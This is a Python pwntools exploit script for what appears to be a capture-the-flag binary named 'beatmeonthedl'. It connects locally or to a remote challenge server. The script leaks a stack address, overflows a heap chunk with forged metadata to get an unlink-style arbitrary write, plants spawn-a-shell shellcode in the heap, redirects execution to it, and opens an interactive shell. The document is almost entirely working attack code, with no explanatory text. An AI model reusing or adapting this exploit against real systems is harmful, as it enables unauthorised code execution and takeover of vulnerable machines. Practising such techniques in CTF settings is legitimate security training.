from pwn import *
import time, sys

useremote = "remote" in sys.argv
filename = "./beatmeonthedl"
if useremote:
	p = remote("lox.xvm.mit.edu", 9999)
else:
	p = process(filename)

context.binary = ELF(filename)
context.log_level = 'debug'

shellcode = asm(shellcraft.sh())


# if not useremote and not "nogdb" in sys.argv:
gdb.attach(p, '''
set disassembly-flavor intel
set height 0
c
''')

# b *0x401198



p.readuntil(":")
p.send("A"*16)
p.readuntil(": ")
leaked = p.readuntil(":")

start = leaked.find("A"*16)+16
print start, leaked
print len(leaked[start:])
stack_ptr = u64(leaked[start:leaked.find("\n", start+1)] + "\x00\x00")
print "Leaked stack address: 0x{:x}".format(stack_ptr)

p.send("mcfly")
p.readuntil(":")
p.send("awesnap")

def create(p, data):
	p.readuntil("|")
	p.send("1")
	p.readuntil(">")
	p.send(data)

def delete(p, num):
	p.readuntil("|")
	p.send("3")
	p.send(str(num))

def edit(p, num, data, dontread = False):
	readdata = ""
	if dontread:
		readdata = p.readuntil("|")
	p.send("4")
	readdata += p.readuntil(":")
	p.send(str(num))
	p.send(data)
	return readdata


payload = 'A' *(0x38) # Write to end of first chunk
payload += p64(0x40) # Overflow into next chunk, mark as inuse so we don't have double-free problems
payload += p64(0x609E80-0x10) # Write the location of our shellcode into bk (the what)
payload += p64(0x609E90) # Write the location of the retn call into fd, plus 4 since it technically writes fd->bk. (the where)

create(p, "first") #0
create(p, "first") #1
create(p, shellcode) #2
create(p, "BBB") #3
delete(p, 0)
create(p, payload) #4
delete(p, 0)
delete(p, 0)

p.clean()
p.send("2")
leaked = p.readuntil("|")
print "leaked", repr(leaked)
p.clean()

start = leaked.find("1) ") + 3
end = leaked.find("\n", start)
data = leaked[start:end]
heap_ptr = u64(data + ("\x00" * (8-len(data))))
print "heap address 0x{:x}".format(heap_ptr)

p.clean()
edit(p, 1, p64(0x6099D8))

p.clean()
edit(p, 2, p64(heap_ptr))

p.write("1")

p.interactive()
#p.sendline(payload)
